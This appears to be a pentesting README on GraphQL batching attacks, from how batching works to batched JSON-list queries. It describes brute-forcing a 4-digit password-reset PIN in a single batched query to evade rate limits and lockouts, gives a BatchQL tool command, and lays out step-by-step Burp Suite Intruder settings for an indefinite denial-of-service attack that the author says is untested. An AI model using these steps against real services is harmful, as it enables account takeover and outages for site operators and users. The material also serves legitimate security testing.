GraphQL is designed in a way that allows you to write clean code on the server, where every field on every type has a focused single-purpose function for resolving that value. However, without additional consideration, a naive GraphQL service could be very “chatty” or repeatedly load data from your databases.

This is commonly solved by a batching technique, where multiple requests for data from a backend are collected over a short period of time and then dispatched in a single request to an underlying database

# GraphQL-Batching-Attack
GraphQL batching attacks can be quite serious depending on the functionalities implemented. For example, imagine a password reset functionality which expects a 4 digit pin that was sent to your email. With this tool, you could attempt all 10k pin attempts in a single GraphQL query. This may bypass any rate limiting or account lockouts depending on the implementation details of the password reset flow.

Tool:
https://github.com/assetnote/batchql

Recommdated Command: (*cautions* may cause the hyper stress in backend)
python3 batch.py -e https://ENDPOINT -w wordlist -p localhost:8080 -s 5000 



JSON list based batching

When sending a GraphQL query, a single query may look like the following:

{"query": "query { Query { hacktheplanet } }"}
As seen in the query above, it consists of a single JSON dictionary containing a single query.

Many GraphQL implementations support sending batch queries by providing a JSON list of queries, like shown below:

[
   {
      "query":"query { assetnote: Query { hacktheplanet } }"
   },
   {
      "query":"query { assetnote: Query { hacktheplanet } }"
   }
]
In this case, a JSON list of queries is provided to the GraphQL server. If the GraphQL API supports this form of batching queries, it will respond with something like this:

[
   {
      "errors":[
         {
            "message":"Cannot query field \"Query\" on type \"Query\".",
            "locations":[
               {
                  "line":1,
                  "column":9
               }
            ]
         }
      ]
   },
   {
      "errors":[
         {
            "message":"Cannot query field \"Query\" on type \"Query\".",
            "locations":[
               {
                  "line":1,
                  "column":9
               }
            ]
         }
      ]
   }
]
Indicating that server-side batching was performed and both of the queries from the request were executed successfully.

TIME TO CONVERT JSON list based batching INTO APPLICATION DOS WITH BURPSUITE (*NOTE NOT TESTED IN BUGBOUNTY PROGRAM)

1. Capture the request JSON list based batching queries from the BatchQL tool
      [
   {
      "query":"query { assetnote: Query { hacktheplanet } }"
   },
   {
      "query":"query { assetnote: Query { hacktheplanet } }"
   }
]
2.Send the request to repeater and replace the above payload with JSON_list_Application_DOS.txt and Send the request three or four times and note response timing.

3. Send the request to Intruder select the whole request and take the null payload, payload options to continue indefinitely, in itruder options go to the attack results and click on Use denial-of-service mode (U can use more then two or more intruder attack tab for more traffic )

4. Start the attack, go to repeater send the request and observe the response and try to load the web page contents generating by the graphql.






